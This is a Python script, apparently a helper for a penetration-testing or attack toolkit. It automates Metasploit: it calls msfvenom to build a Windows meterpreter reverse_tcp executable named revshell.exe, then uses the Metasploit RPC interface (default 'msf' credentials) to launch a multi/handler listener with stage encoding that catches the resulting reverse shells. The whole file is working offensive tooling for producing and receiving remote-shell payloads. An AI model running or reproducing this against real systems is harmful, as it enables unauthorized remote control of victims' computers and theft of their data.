import subprocess
import time
import socket
from pymetasploit3.msfrpc import MsfRpcClient
import subprocess

def build_payload(lhost, lport, output_file="payloads/revshell.exe"):
    try:
        print(f"[+] Building payload for {lhost}:{lport}...")

        result = subprocess.run([
            "msfvenom",
            "-p", "windows/meterpreter/reverse_tcp",
            f"LHOST={lhost}",
            f"LPORT={lport}",
            "-f", "exe",
            "-o", output_file
        ], capture_output=True, text=True)

        if result.returncode == 0:
            print(f"[+] Payload saved as: {output_file}")
            return output_file
        else:
            print("[-] Payload generation failed:\n", result.stderr)
            return None
    except Exception as e:
        print(f"[-] Exception during payload generation: {e}")
        return None

def wait_for_listener(port=4444, timeout=10):
    for _ in range(timeout):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                result = s.connect_ex(('0.0.0.0', port))  # 0.0.0.0 = all interfaces
                if result == 0:
                    return True
        except Exception:
            pass
        time.sleep(1)
    return False

def start_listener(lhost, lport):
    try:
        print(f"[+] Connecting to Metasploit RPC to start listener on {lhost}:{lport}...")

        client = MsfRpcClient(password='msf', username='msf', port=55553, ssl=False)
        handler = client.modules.use('exploit', 'multi/handler')

        handler['PAYLOAD'] = 'windows/meterpreter/reverse_tcp'
        handler['LHOST'] = lhost
        handler['LPORT'] = lport
        handler['ExitOnSession'] = False
        handler['EnableStageEncoding'] = True
        handler['ExitFunc'] = 'thread'

        job_id = handler.execute()

        print("[*] Handler launched. Waiting for listener to bind to port...")
        if wait_for_listener(port=lport, timeout=15):
            return f"[+] Listener running on {lhost}:{lport} (Job ID: {job_id})"
        else:
            return f"[-] Listener failed to bind to port {lport}. Please verify RPC and msfrpcd are working."

    except Exception as e:
        return f"[-] Listener failed: {e}"









